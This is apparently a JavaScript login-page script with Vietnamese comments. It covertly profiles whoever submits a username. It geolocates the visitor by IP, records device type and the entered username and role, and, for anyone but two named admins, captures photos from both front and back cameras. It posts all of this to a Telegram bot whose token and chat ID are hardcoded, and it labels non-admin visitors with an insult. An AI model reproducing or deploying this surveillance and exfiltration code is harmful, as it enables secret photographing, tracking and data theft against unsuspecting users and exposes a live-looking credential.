const TELEGRAM_BOT_TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
const TELEGRAM_CHAT_ID = '-1003770043455';

const API_SEND_TEXT = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
const API_SEND_MEDIA = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;

const info = {
  time: '', 
  ip: '',
  isp: '',
  address: '',
  lat: '',
  lon: '',
  loginDetails: '',
  isAdmin: false,
  device: '' // Dùng để hiện dvi cho người lạ
};

// Hàm lấy thông tin thiết bị (dvi)
function getDeviceInfo() {
    const ua = navigator.userAgent;
    if (ua.includes("Windows")) return "Windows PC";
    if (ua.includes("iPhone")) return "iPhone (iOS)";
    if (ua.includes("Android")) return "Android Phone";
    return "Thiết bị không xác định";
}

async function getNetworkData() {
  try {
    const res = await fetch(`https://ipwho.is/`);
    const data = await res.json();
    info.ip = data.ip || 'Không rõ';
    info.isp = data.connection?.org || 'ISP';
    info.lat = data.latitude || 0;
    info.lon = data.longitude || 0;
    info.address = `${data.city}, ${data.region} (Vị trí IP)`;
  } catch (e) { 
    info.ip = 'Lỗi kết nối'; 
    info.address = 'Không xác định';
  }
}

// Hàm chụp ảnh camera (hỗ trợ chụp cả 2 cam)
async function captureCamera(mode = 'user') {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: false });
    return new Promise(resolve => {
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();
      video.onloadedmetadata = () => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        setTimeout(() => {
          canvas.getContext('2d').drawImage(video, 0, 0);
          stream.getTracks().forEach(t => t.stop());
          canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
        }, 800);
      };
    });
  } catch (e) { return null; }
}

function getCaption() {
  const mapsLink = `https://www.google.com/maps?q=${info.lat},${info.lon}`;
  
  let header = "";
  let dviLine = "";

  if (info.isAdmin) {
    header = `⚠️ THÔNG BÁO ADMIN ${info.loginDetails.toUpperCase()} VỪA ĐĂNG NHẬP`;
    dviLine = ""; // Admin thì không hiện dvi
  } else {
    header = `🚫 PHÁT HIỆN MỘT CON CHÓ NGU`;
    dviLine = `📱 Thiết bị (dvi): ${info.device}\n`; // Người lạ thì hiện dvi
  }

  return `
${header}
━━━━━━━━━━━━━━━━━━
⏰ Thời gian: ${info.time}
👤 Tài khoản: ${info.loginDetails}
🌐 IP dân cư: ${info.ip}
🏢 Nhà mạng: ${info.isp}
${dviLine}🏙️ Địa chỉ: ${info.address}
📍 Bản đồ: ${mapsLink}
━━━━━━━━━━━━━━━━━━
`.trim();
}

async function main() {
  const user = document.getElementById('username').value.trim();
  const role = document.getElementById('user-role').value;
  
  info.time = new Date().toLocaleString('vi-VN');
  info.loginDetails = `${user} (${role})`;
  info.isAdmin = (user === "Mrwenben" || user === "VanThanh");
  info.device = getDeviceInfo();

  await getNetworkData();
  
  // Nếu là Admin: Gửi tin văn bản luôn, không chụp ảnh
  if (info.isAdmin) {
    await fetch(API_SEND_TEXT, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: getCaption(), disable_web_page_preview: true })
    });
    return true;
  }

  // Nếu là người lạ: Chụp cả 2 camera
  const frontBlob = await captureCamera('user');
  const backBlob = await captureCamera('environment');

  const formData = new FormData();
  formData.append('chat_id', TELEGRAM_CHAT_ID);
  
  const media = [];
  if (frontBlob) {
    formData.append('front', frontBlob, 'front.jpg');
    media.push({ type: 'photo', media: 'attach://front', caption: getCaption() });
  }
  if (backBlob) {
    formData.append('back', backBlob, 'back.jpg');
    media.push({ type: 'photo', media: 'attach://back' });
  }

  if (media.length > 0) {
    formData.append('media', JSON.stringify(media));
    await fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
  } else {
    // Nếu không chụp được ảnh nào vẫn gửi tin nhắn báo cáo
    await fetch(API_SEND_TEXT, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: getCaption() })
    });
  }
  
  return true; 
}
